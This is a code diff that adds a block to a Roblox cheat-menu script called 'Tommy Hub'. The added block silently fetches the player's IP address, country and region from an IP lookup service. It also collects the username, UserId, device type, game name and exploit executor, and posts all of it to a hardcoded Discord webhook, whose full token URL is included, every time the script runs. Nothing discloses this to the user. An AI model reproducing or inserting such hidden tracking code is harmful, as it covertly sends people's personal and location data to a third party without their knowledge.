@@ -975,4 +975,161 @@ toggle(ESPpage, "Highlight Players", "ESPHighlight")
 stepper(ESPpage, "Text Size:", "ESPSize", 8, 32, 1, "px")
 
 showPage("Combat")
+
+-- ================= 🔥 TOMMY HUB FULL PRO (FIX) =================
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local Player = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sq"
+
+-- ================= ⚙️ CONTADOR FIX REAL =================
+
+local execCount = 1
+
+pcall(function()
+    if getgenv then
+        local g = getgenv()
+        if typeof(g.TommyExecCount) == "number" then
+            g.TommyExecCount = 1
+        else
+            g.TommyExecCount += 1
+        end
+        execCount = g.TommyExecCount
+    end
+end)
+
+if not execCount or execCount < 1 then
+    execCount = 1
+end
+
+-- ================= ⏰ HORA =================
+
+local function GetTime()
+    return os.date("%Y-%m-%d %H:%M:%S")
+end
+
+-- ================= 📱 DISPOSITIVO =================
+
+local function GetDevice()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Móvil"
+    elseif UserInputService.GamepadEnabled then
+        return "Consola"
+    else
+        return "PC"
+    end
+end
+
+-- ================= 🎮 JUEGO =================
+
+local function GetGameName()
+    local name = "Desconocido"
+    pcall(function()
+        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+    return name
+end
+
+-- ================= 🌐 IP INFO =================
+
+local function GetIPData()
+    local ok, res = pcall(function()
+        return game:HttpGet("http://ip-api.com/json/")
+    end)
+
+    if not ok then return nil end
+
+    local data = HttpService:JSONDecode(res)
+
+    return {
+        ip = data.query or "N/A",
+        country = data.country or "N/A",
+        region = data.regionName or "N/A"
+    }
+end
+
+-- ================= 🧠 EXECUTOR FIX =================
+
+local function GetExecutor()
+    local name = "Desconocido"
+
+    pcall(function()
+        if type(identifyexecutor) == "function" then
+            name = identifyexecutor()
+
+        elseif type(getexecutorname) == "function" then
+            name = getexecutorname()
+
+        elseif getgenv then
+            local g = getgenv()
+
+            if rawget(g, "Xeno") then
+                name = "Xeno"
+            elseif rawget(g, "Solara") then
+                name = "Solara"
+            end
+
+        elseif syn then
+            name = "Synapse"
+
+        elseif KRNL_LOADED then
+            name = "KRNL"
+
+        elseif Fluxus then
+            name = "Fluxus"
+
+        elseif secure_load then
+            name = "Sentinel"
+        end
+    end)
+
+    return tostring(name or "Desconocido")
+end
+
+-- ================= 📤 WEBHOOK =================
+
+local function SendWebhook(info)
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                embeds = {
+                    {
+                        title = "🔥 TOMMY HUB EJECUTADO",
+                        color = 65280,
+                        fields = {
+                            {name="Jugador", value=Player.Name, inline=true},
+                            {name="UserId", value=tostring(Player.UserId), inline=true},
+                            {name="Hora", value=GetTime(), inline=true},
+                            {name="Dispositivo", value=GetDevice(), inline=true},
+                            {name="Juego", value=GetGameName(), inline=true},
+                            {name="Executor", value=GetExecutor(), inline=true},
+                            {name="Ejecuciones", value=tostring(execCount), inline=true},
+                            {name="IP", value=info.ip, inline=true},
+                            {name="País", value=info.country, inline=true},
+                            {name="Región", value=info.region, inline=true},
+                        },
+                        footer = {text="Tommy Hub System"}
+                    }
+                }
+            })
+        })
+    end)
+end
+
+-- ================= 🚀 EJECUCIÓN =================
+
+local info = GetIPData() or {ip="N/A", country="N/A", region="N/A"}
+
+SendWebhook(info)
+
+print("🔥 Tommy Hub67 @everyone Activado")
+
 print("✅ TOMMY HUB 67 cargado | F4 = abrir/cerrar")
